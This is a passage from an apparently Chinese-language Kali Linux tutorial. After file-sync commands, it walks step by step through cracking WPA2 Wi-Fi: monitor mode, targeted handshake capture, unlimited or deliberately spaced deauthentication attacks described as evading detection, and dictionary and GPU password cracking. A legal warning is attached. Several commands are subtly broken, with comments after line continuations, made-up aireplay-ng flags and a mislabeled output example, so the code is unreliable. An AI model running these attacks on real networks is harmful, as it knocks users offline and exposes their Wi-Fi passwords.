</span></span><span class=line><span class=cl>rsync -avz --progress -e <span class=s2>&#34;ssh -p 22&#34;</span> /home/kali/Projects/ justwin@192.168.1.50:/C:/Users/justwin/Kali-Projects/
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># 关键参数解释：</span>
</span></span><span class=line><span class=cl><span class=c1># -a: 归档模式（保留权限、时间戳、所有者）</span>
</span></span><span class=line><span class=cl><span class=c1># -v: 详细输出</span>
</span></span><span class=line><span class=cl><span class=c1># -z: 压缩传输</span>
</span></span><span class=line><span class=cl><span class=c1># --progress: 显示进度条</span>
</span></span><span class=line><span class=cl><span class=c1># -e ssh: 通过SSH隧道（加密）</span>
</span></span><span class=line><span class=cl><span class=c1># --delete: 镜像删除（危险但实用）</span>
</span></span><span class=line><span class=cl><span class=c1># --exclude=&#39;*.tmp&#39;: 排除临时文件</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># ========== 方案3：SSHFS（实时挂载）==========</span>
</span></span><span class=line><span class=cl><span class=c1># 将远程目录挂载为本地磁盘，实时读写</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># Kali端安装</span>
</span></span><span class=line><span class=cl>sudo apt install -y sshfs
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># 创建挂载点</span>
</span></span><span class=line><span class=cl>mkdir -p ~/remote-projects
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># 挂载Windows共享</span>
</span></span><span class=line><span class=cl>sshfs justwin@192.168.1.50:/C:/Users/justwin/Projects ~/remote-projects <span class=se>\
</span></span></span><span class=line><span class=cl><span class=se></span>  -o reconnect,ServerAliveInterval<span class=o>=</span>15,ServerAliveCountMax<span class=o>=</span>3,idmap<span class=o>=</span>user
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># 参数说明：</span>
</span></span><span class=line><span class=cl><span class=c1># -o reconnect: 自动重连</span>
</span></span><span class=line><span class=cl><span class=c1># ServerAliveInterval: 每15秒发送心跳</span>
</span></span><span class=line><span class=cl><span class=c1># idmap=user: 映射用户ID</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># 卸载</span>
</span></span><span class=line><span class=cl>fusermount -u ~/remote-projects
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># 永久挂载（/etc/fstab）</span>
</span></span><span class=line><span class=cl><span class=c1># 添加：</span>
</span></span><span class=line><span class=cl><span class=c1># sshfs#justwin@192.168.1.50:/C:/Users/justwin/Projects /home/kali/remote-projects fuse defaults,user,_netdev,reconnect 0 0</span>
</span></span></code></pre></td></tr></table></div></div><p><strong>协议对比</strong>：</p><ul><li><strong>Unison</strong>：双向同步，需双方安装，适合冲突少的场景</li><li><strong>rsync</strong>：单向镜像，行业标配，稳定高效</li><li><strong>SSHFS</strong>：实时挂载，延迟较高但无缝集成</li></ul><hr><h2 id=七无线安全测试aircrack-ng终极详解>七、无线安全测试（Aircrack-ng终极详解）</h2><h3 id=原文重大错误修正>原文重大错误修正</h3><ol><li><strong>命令不完整</strong>：<code>airodump-ng wifi名称</code> 是错误的语法</li><li><strong>参数顺序错误</strong>：<code>-w</code>应在网卡之前</li><li><strong>缺少准备步骤</strong>：未检查网卡兼容性</li><li><strong>缺少监控模式检查</strong></li><li><strong>缺少数据包分析</strong></li><li><strong>法律警告缺失</strong></li></ol><h3 id=完整渗透测试流程仅用于授权测试>完整渗透测试流程（仅用于授权测试）</h3><h4 id=步骤0法律与道德警告>步骤0：法律与道德警告</h4><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span><span class=lnt>6
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=c1># ========== 重要法律声明 ==========</span>
</span></span><span class=line><span class=cl><span class=c1># 以下操作仅在获得明确书面授权时合法</span>
</span></span><span class=line><span class=cl><span class=c1># 未经授权的WiFi破解构成犯罪（刑法285条）</span>
</span></span><span class=line><span class=cl><span class=c1># 最低刑期：3年以下有期徒刑或拘役</span>
</span></span><span class=line><span class=cl><span class=c1># 使用前必须：sudo airmon-ng check kill</span>
</span></span><span class=line><span class=cl><span class=c1># ==================================</span>
</span></span></code></pre></td></tr></table></div></div><h4 id=步骤1硬件识别与驱动检查>步骤1：硬件识别与驱动检查</h4><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=c1># 查看无线网卡（现代Kali应使用iw而非iwconfig）</span>
</span></span><span class=line><span class=cl>iw dev
</span></span><span class=line><span class=cl><span class=c1># 输出示例：</span>
</span></span><span class=line><span class=cl><span class=c1># phy#0</span>
</span></span><span class=line><span class=cl><span class=c1>#   Interface wlan0</span>
</span></span><span class=line><span class=cl><span class=c1>#       ifindex 3</span>
</span></span><span class=line><span class=cl><span class=c1>#       type managed  # 当前模式：管理模式</span>
</span></span><span class=line><span class=cl><span class=c1>#       channel 6 (2437 MHz)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># 检查网卡是否支持监控模式</span>
</span></span><span class=line><span class=cl>iw list <span class=p>|</span> grep -A <span class=m>10</span> <span class=s2>&#34;Supported interface modes&#34;</span>
</span></span><span class=line><span class=cl><span class=c1># 必须包含：* monitor</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># 传统方式（旧工具）</span>
</span></span><span class=line><span class=cl>iwconfig
</span></span><span class=line><span class=cl><span class=c1># 输出：wlan0  IEEE 802.11  ESSID:off/any</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># 检查驱动冲突（关键步骤！）</span>
</span></span><span class=line><span class=cl>sudo airmon-ng check
</span></span><span class=line><span class=cl><span class=c1># 会列出可能干扰的进程（NetworkManager, wpa_supplicant等）</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># 终止干扰进程（会断网，需提前准备）</span>
</span></span><span class=line><span class=cl>sudo airmon-ng check <span class=nb>kill</span>
</span></span><span class=line><span class=cl><span class=c1># 或手动停止：sudo systemctl stop NetworkManager</span>
</span></span></code></pre></td></tr></table></div></div><p><strong>硬件知识</strong>：支持监控模式的芯片组包括Atheros AR9271, RT3070, RTL8812AU。Intel内置网卡通常不支持。</p><h4 id=步骤2启动监听模式>步骤2：启动监听模式</h4><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=c1># 方式A：使用airmon-ng（自动）</span>
</span></span><span class=line><span class=cl>sudo airmon-ng start wlan0
</span></span><span class=line><span class=cl><span class=c1># 输出：monitor mode enabled on wlan0mon</span>
</span></span><span class=line><span class=cl><span class=c1># 注意：原网卡wlan0会消失，变为wlan0mon</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># 方式B：手动设置（更可控）</span>
</span></span><span class=line><span class=cl>sudo ip link <span class=nb>set</span> wlan0 down                     <span class=c1># 关闭接口</span>
</span></span><span class=line><span class=cl>sudo iw dev wlan0 <span class=nb>set</span> monitor none              <span class=c1># 设置监控模式</span>
</span></span><span class=line><span class=cl>sudo ip link <span class=nb>set</span> wlan0 up                       <span class=c1># 重新启用</span>
</span></span><span class=line><span class=cl>sudo ip link <span class=nb>set</span> wlan0 name wlan0mon            <span class=c1># 重命名</span>
</span></span><span class=line><span class=cl><span class=c1># 优点：不自动修改MAC地址，更隐蔽</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># 验证模式</span>
</span></span><span class=line><span class=cl>iwconfig wlan0mon
</span></span><span class=line><span class=cl><span class=c1># 输出：Mode:Monitor</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># 设置信道（与目标AP一致）</span>
</span></span><span class=line><span class=cl>sudo iw dev wlan0mon <span class=nb>set</span> channel <span class=m>6</span>
</span></span></code></pre></td></tr></table></div></div><p><strong>技术原理</strong>：监控模式(Monitor Mode)让网卡接收所有802.11帧，不验证MAC地址或FCS校验，是抓包的基础。</p><h4 id=步骤3扫描目标网络>步骤3：扫描目标网络</h4><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=c1># 基础扫描</span>
</span></span><span class=line><span class=cl>sudo airodump-ng wlan0mon
</span></span><span class=line><span class=cl><span class=c1># 输出列说明：</span>
</span></span><span class=line><span class=cl><span class=c1># BSSID: AP的MAC地址</span>
</span></span><span class=line><span class=cl><span class=c1># PWR: 信号强度（负数，越接近0越强）</span>
</span></span><span class=line><span class=cl><span class=c1># CH: 信道</span>
</span></span><span class=line><span class=cl><span class=c1># ENC: 加密方式（WPA2, WPA3）</span>
</span></span><span class=line><span class=cl><span class=c1># ESSID: 网络名称（可能隐藏）</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># 高级扫描（写入文件并过滤）</span>
</span></span><span class=line><span class=cl>sudo airodump-ng <span class=se>\
</span></span></span><span class=line><span class=cl><span class=se></span>  --write /tmp/scan_results <span class=se>\ </span>          <span class=c1># 保存抓包文件</span>
</span></span><span class=line><span class=cl>  --output-format csv <span class=se>\ </span>                <span class=c1># 生成CSV便于分析</span>
</span></span><span class=line><span class=cl>  --band abg <span class=se>\ </span>                         <span class=c1># 扫描2.4G+5G</span>
</span></span><span class=line><span class=cl>  wlan0mon
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># 后台运行（方便后续操作）</span>
</span></span><span class=line><span class=cl>sudo airodump-ng wlan0mon &gt; /tmp/ap_list.txt <span class=p>&amp;</span>
</span></span></code></pre></td></tr></table></div></div><h4 id=步骤4精准捕获握手包>步骤4：精准捕获握手包</h4><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span><span class=lnt>30
</span><span class=lnt>31
</span><span class=lnt>32
</span><span class=lnt>33
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=c1># 假设目标：</span>
</span></span><span class=line><span class=cl><span class=c1># ESSID: &#34;TargetCorp&#34;</span>
</span></span><span class=line><span class=cl><span class=c1># BSSID: B0:D5:9D:42:FA:A3</span>
</span></span><span class=line><span class=cl><span class=c1># CH: 11</span>
</span></span><span class=line><span class=cl><span class=c1># Client: C4:F0:81:02:87:5E</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># 创建专用目录</span>
</span></span><span class=line><span class=cl>mkdir -p ~/captures/handshakes
</span></span><span class=line><span class=cl><span class=nb>cd</span> ~/captures
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># 启动精准捕获</span>
</span></span><span class=line><span class=cl>sudo airodump-ng <span class=se>\
</span></span></span><span class=line><span class=cl><span class=se></span>  --channel <span class=m>11</span> <span class=se>\ </span>                       <span class=c1># 锁定信道（关键！）</span>
</span></span><span class=line><span class=cl>  --bssid B0:D5:9D:42:FA:A3 <span class=se>\ </span>        <span class=c1># 目标AP的MAC</span>
</span></span><span class=line><span class=cl>  --write handshakes/targetcorp <span class=se>\ </span>      <span class=c1># 输出前缀</span>
</span></span><span class=line><span class=cl>  --write-interval <span class=m>10</span> <span class=se>\ </span>                <span class=c1># 每10秒写盘一次</span>
</span></span><span class=line><span class=cl>  wlan0mon
</span></span><span class=line><span class=cl><span class=c1># 窗口会显示：</span>
</span></span><span class=line><span class=cl><span class=c1># [ WPA handshake: B0:D5:9D:42:FA:A3 ]  ← 出现此提示即成功！</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># 参数详解：</span>
</span></span><span class=line><span class=cl><span class=c1># -c, --channel: 频道号，必须与AP一致</span>
</span></span><span class=line><span class=cl><span class=c1># -w, --write: 输出文件前缀，自动添加-01.cap等后缀</span>
</span></span><span class=line><span class=cl><span class=c1># --bssid: 目标AP的MAC地址过滤</span>
</span></span><span class=line><span class=cl><span class=c1># --write-interval: 防止数据丢失的刷新间隔（秒）</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># 握手包捕获原理：</span>
</span></span><span class=line><span class=cl><span class=c1># 当客户端（手机/电脑）连接AP时，进行四次握手：</span>
</span></span><span class=line><span class=cl><span class=c1># 1. AP → Client: ANonce（随机数）</span>
</span></span><span class=line><span class=cl><span class=c1># 2. Client → AP: SNonce + MIC（消息完整性校验）</span>
</span></span><span class=line><span class=cl><span class=c1># 3. AP → Client: GTK + MIC</span>
</span></span><span class=line><span class=cl><span class=c1># 4. Client → AP: 确认</span>
</span></span><span class=line><span class=cl><span class=c1># 捕获此过程即可离线破解</span>
</span></span></code></pre></td></tr></table></div></div><h4 id=步骤5主动攻击加速握手获取>步骤5：主动攻击加速握手获取</h4><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=c1># 在另一个终端（Ctrl+Shift+E打开新分屏）</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># Deauth攻击（发送伪造断开包）</span>
</span></span><span class=line><span class=cl>sudo aireplay-ng <span class=se>\
</span></span></span><span class=line><span class=cl><span class=se></span>  --deauth <span class=m>10</span> <span class=se>\ </span>                        <span class=c1># 发送10个断开包</span>
</span></span><span class=line><span class=cl>  --source B0:D5:9D:42:FA:A3 <span class=se>\ </span>       <span class=c1># AP MAC（-a参数）</span>
</span></span><span class=line><span class=cl>  --destination C4:F0:81:02:87:5E <span class=se>\ </span>  <span class=c1># 客户端MAC（-c参数）</span>
</span></span><span class=line><span class=cl>  wlan0mon
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># 参数详解：</span>
</span></span><span class=line><span class=cl><span class=c1># --deauth: 802.11认证解除帧</span>
</span></span><span class=line><span class=cl><span class=c1># 10: 次数，太少可能没效果，太多引起警惕</span>
</span></span><span class=line><span class=cl><span class=c1># --source (-a): 仿造的AP MAC地址</span>
</span></span><span class=line><span class=cl><span class=c1># --destination (-c): 目标客户端MAC地址</span>
</span></span><span class=line><span class=cl><span class=c1># --ignore-negative-one: 忽略信道错误（有时需要）</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># 高级攻击：广播Deauth（对所有客户端）</span>
</span></span><span class=line><span class=cl>sudo aireplay-ng --deauth <span class=m>0</span> -a B0:D5:9D:42:FA:A3 wlan0mon
</span></span><span class=line><span class=cl><span class=c1># 0表示无限发送，直到Ctrl+C停止</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># 隐蔽攻击：使用时间间隔</span>
</span></span><span class=line><span class=cl>sudo aireplay-ng --deauth <span class=m>5</span> -a B0:D5:9D:42:FA:A3 --delay <span class=m>30</span> wlan0mon
</span></span><span class=line><span class=cl><span class=c1># --delay: 每次攻击间隔30秒，降低被发现概率</span>
</span></span></code></pre></td></tr></table></div></div><p><strong>攻击原理</strong>：利用802.11协议缺陷，不加密管理帧。发送伪造的deauth帧使客户端断开，重连时即可捕获握手包。</p><h4 id=步骤6离线破解密码>步骤6：离线破解密码</h4><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span><span class=lnt>30
</span><span class=lnt>31
</span><span class=lnt>32
</span><span class=lnt>33
</span><span class=lnt>34
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=c1># 预备：准备字典文件</span>
</span></span><span class=line><span class=cl><span class=c1># 推荐字典：</span>
</span></span><span class=line><span class=cl><span class=c1># - rockyou.txt: Kali自带，14M条，/usr/share/wordlists/rockyou.txt.gz</span>
</span></span><span class=line><span class=cl><span class=c1># - SecLists: 安装：sudo apt install seclists</span>
</span></span><span class=line><span class=cl><span class=c1># - 生成自定义字典：crunch 8 12 -t pass@@@@ -o mydict.txt</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># 破解命令</span>
</span></span><span class=line><span class=cl>sudo aircrack-ng <span class=se>\
</span></span></span><span class=line><span class=cl><span class=se></span>  --wordlist /usr/share/wordlists/rockyou.txt <span class=se>\
</span></span></span><span class=line><span class=cl><span class=se></span>  --bssid B0:D5:9D:42:FA:A3 <span class=se>\
</span></span></span><span class=line><span class=cl><span class=se></span>  handshakes/targetcorp-01.cap
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># 参数详解：</span>
</span></span><span class=line><span class=cl><span class=c1># -w, --wordlist: 密码字典路径</span>
</span></span><span class=line><span class=cl><span class=c1># -b, --bssid: 目标AP的MAC（用于过滤无关握手）</span>
</span></span><span class=line><span class=cl><span class=c1># handshakes/targetcorp-01.cap: 捕获文件</span>
</span></span><span class=line><span class=cl><span class=c1># -01表示第一个文件，-02为第二个（如果split）</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># 高级技巧：使用GPU加速</span>
</span></span><span class=line><span class=cl><span class=c1># 安装hashcat（比aircrack快1000倍+）</span>
</span></span><span class=line><span class=cl>sudo apt install -y hashcat
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># 转换cap为hccapx格式</span>
</span></span><span class=line><span class=cl>sudo apt install -y hcxtools
</span></span><span class=line><span class=cl>hcxpcapngtool -o hash.hc22000 handshakes/targetcorp-01.cap
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># GPU破解（NVIDIA）</span>
</span></span><span class=line><span class=cl>hashcat -m <span class=m>22000</span> -a <span class=m>0</span> hash.hc22000 /usr/share/wordlists/rockyou.txt --force
</span></span><span class=line><span class=cl><span class=c1># -m 22000: WPA-PBKDF2-PMKID+EAPOL</span>
</span></span><span class=line><span class=cl><span class=c1># -a 0: 字典攻击模式</span>
</span></span><span class=line><span class=cl><span class=c1># --force: 忽略警告</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># 破解成功后会显示：</span>
</span></span><span class=line><span class=cl><span class=c1># B0:D5:9D:42:FA:A3:PMKID:1234567890abcdef:password123</span>
</span></span></code></pre></td></tr></table></div></div><p><strong>密码学原理</strong>：WPA2使用PBKDF2算法，SSID作为盐值，4096次HMAC-SHA1迭代生成PMK。捕获的握手包含PMK的验证值，可用于离线校验密码。</p><h4 id=步骤7结果验证与清理>步骤7：结果验证与清理</h4><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=c1># 1. 验证破解结果</span>
</span></span><span class=line><span class=cl>aircrack-ng handshakes/targetcorp-01.cap -w /path/to/cracked-password.txt
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># 2. 关闭监控模式</span>
</span></span><span class=line><span class=cl>sudo airmon-ng stop wlan0mon
</span></span><span class=line><span class=cl><span class=c1># 会恢复网卡为managed模式</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># 3. 重启网络服务</span>
</span></span><span class=line><span class=cl>sudo systemctl start NetworkManager
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># 4. 生成报告</span>
</span></span><span class=line><span class=cl><span class=c1># 使用airgraph-ng可视化</span>
</span></span><span class=line><span class=cl>sudo apt install -y airgraph-ng
</span></span><span class=line><span class=cl>airgraph-ng -i handshakes/targetcorp-01.csv -o graph.png -g CAPR
</span></span></code></pre></td></tr></table></div></div><hr><h2 id=八kali-linux核心知识点补充>八、Kali Linux核心知识点补充</h2><h3 id=1-kali特有目录结构>1. Kali特有目录结构</h3><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span><span class=lnt>6
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=c1># 渗透测试专用目录</span>
</span></span><span class=line><span class=cl>/usr/share/wordlists/          <span class=c1># 密码字典（rockyou, sqlmap.txt）</span>
</span></span><span class=line><span class=cl>/usr/share/exploitdb/          <span class=c1># Exploit-DB漏洞利用代码</span>
</span></span><span class=line><span class=cl>/usr/share/metasploit-framework/ <span class=c1># Metasploit核心</span>
</span></span><span class=line><span class=cl>/usr/share/nmap/scripts/       <span class=c1># NSE脚本</span>
</span></span><span class=line><span class=cl>/opt/                          <span class=c1># 第三方工具（BurpSuite, CobaltStrike）</span>
</span></span></code></pre></td></tr></table></div></div><h3 id=2-系统服务管理现代方法>2. 系统服务管理（现代方法）</h3><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=c1># Kali基于Debian，使用systemd</span>
</span></span><span class=line><span class=cl>sudo systemctl start/stop/restart/status &lt;服务名&gt;
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># 常见服务：</span>
</span></span><span class=line><span class=cl>sudo systemctl start postgresql     <span class=c1># Metasploit数据库</span>
</span></span><span class=line><span class=cl>sudo systemctl start apache2        <span class=c1># Web服务</span>
</span></span><span class=line><span class=cl>sudo systemctl start tor            <span class=c1># Tor代理</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># 开机自启</span>
</span></span><span class=line><span class=cl>sudo systemctl <span class=nb>enable</span> &lt;服务名&gt;
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># 查看监听端口</span>
</span></span><span class=line><span class=cl>sudo ss -tulnp <span class=p>|</span> grep LISTEN
</span></span><span class=line><span class=cl><span class=c1># 或：sudo netstat -tulnp</span>
</span></span></code></pre></td></tr></table></div></div><h3 id=3-网络管理革命iproute2>3. 网络管理革命（iproute2）</h3><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span><span class=lnt>6
</span><span class=lnt>7
</span><span class=lnt>8
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=c1># 现代Kali应弃用ifconfig，改用ip命令</span>
</span></span><span class=line><span class=cl>ip a              <span class=c1># 查看所有接口（= ifconfig -a）</span>
</span></span><span class=line><span class=cl>ip link <span class=nb>set</span> dev eth0 up/down  <span class=c1># 启/禁用网卡</span>
</span></span><span class=line><span class=cl>ip addr add 192.168.1.100/24 dev eth0  <span class=c1># 添加IP</span>
</span></span><span class=line><span class=cl>ip route show     <span class=c1># 查看路由表</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># 查看无线详情</span>
</span></span><span class=line><span class=cl>iw dev wlan0 scan <span class=p>|</span> grep SSID
</span></span></code></pre></td></tr></table></div></div><h3 id=4-kali-metapackages按需安装>4. Kali Metapackages（按需安装）</h3><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span><span class=lnt>6
</span><span class=lnt>7
</span><span class=lnt>8
</span><span class=lnt>9
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=c1># 查看可用元包</span>
</span></span><span class=line><span class=cl>apt search kali-linux-
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># 重要元包：</span>
</span></span><span class=line><span class=cl>sudo apt install kali-tools-top10      <span class=c1># 十大常用工具</span>
</span></span><span class=line><span class=cl>sudo apt install kali-tools-wireless   <span class=c1># 所有无线工具</span>
</span></span><span class=line><span class=cl>sudo apt install kali-tools-web        <span class=c1># Web渗透工具</span>
</span></span><span class=line><span class=cl>sudo apt install kali-tools-exploitation <span class=c1># 漏洞利用框架</span>
</span></span><span class=line><span class=cl>sudo apt install kali-tools-crypto     <span class=c1># 密码学工具</span>
</span></span></code></pre></td></tr></table></div></div><h3 id=5-python环境管理>5. Python环境管理</h3><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=c1># Kali默认Python3</span>
</span></span><span class=line><span class=cl>python3 --version
</span></span><span class=line><span class=cl>
